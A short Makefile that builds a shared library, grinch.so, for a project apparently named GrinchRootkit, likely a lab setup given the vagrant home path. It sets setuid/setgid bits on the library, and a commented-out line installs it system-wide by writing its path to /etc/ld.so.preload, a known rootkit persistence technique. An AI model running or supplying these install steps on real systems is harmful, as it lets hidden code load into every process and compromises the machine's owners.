OPTS=-Wall -fPIC -shared -ldl

all:
	gcc -o grinch.so grinch.c ${OPTS}
	chmod 7755 grinch.so
	#echo "/home/vagrant/GrinchRootkit/grinch.so" > /etc/ld.so.preload
clean:
	rm grinch.so
